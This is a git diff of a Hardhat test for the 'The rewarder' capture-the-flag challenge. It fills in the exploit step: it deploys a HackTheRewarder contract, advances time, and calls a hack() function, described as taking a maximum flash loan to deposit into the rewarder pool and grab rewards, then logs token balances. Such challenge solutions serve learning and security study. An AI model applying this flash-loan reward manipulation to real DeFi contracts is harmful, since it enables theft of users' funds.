@@ -65,7 +65,45 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+
+        // Deploy the HackTheRewarder contract
+        console.log('Deploying HackTheRewarder contract...');
+        const HackTheRewarder = await ethers.getContractFactory('HackTheRewarder', deployer);
+        let hack = await HackTheRewarder.deploy(
+            this.flashLoanPool.address,
+            this.liquidityToken.address,
+            this.rewarderPool.address,
+            this.rewardToken.address,
+            attacker.address
+        );
+        await hack.deployed();
+
+        // Advance 5 days
+        console.log('Advance 5 days...');
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        await ethers.provider.send("evm_mine");  // Mine a block
+        console.log(`isNewRewardsRound(): ${await this.rewarderPool.isNewRewardsRound()}`);
+        console.log(`roundNumber(): ${await this.rewarderPool.roundNumber()}`);
+
+        console.log(`TheRewarderPool DVT Balance: ${await this.liquidityToken.balanceOf(this.rewarderPool.address)}`);
+        console.log(`FlashLoanPool DVT Balance: ${await this.liquidityToken.balanceOf(this.flashLoanPool.address)}`);
+        console.log(`HackTheRewarder DVT Balance: ${await this.liquidityToken.balanceOf(hack.address)}`);
+        console.log(`HackTheRewarder RT Balance: ${await this.rewardToken.balanceOf(hack.address)}`);
+        console.log(`Attacker RT Balance: ${await this.rewardToken.balanceOf(attacker.address)}`);
+
+        // Call hack()
+        //    - Take a flashloan for max amount
+        //    - Deposit into TheReward
+        console.log('Hack!');
+        await hack.connect(attacker).hack();
+        await ethers.provider.send("evm_mine");  // Mine a block
+
+        console.log(`TheRewarderPool DVT Balance: ${await this.liquidityToken.balanceOf(this.rewarderPool.address)}`);
+        console.log(`FlashLoanPool DVT Balance: ${await this.liquidityToken.balanceOf(this.flashLoanPool.address)}`);
+        console.log(`HackTheRewarder DVT Balance: ${await this.liquidityToken.balanceOf(hack.address)}`);
+        console.log(`HackTheRewarder RT Balance: ${await this.rewardToken.balanceOf(hack.address)}`);
+        console.log(`Attacker RT Balance: ${await this.rewardToken.balanceOf(attacker.address)}`);
+
     });
 
     after(async function () {
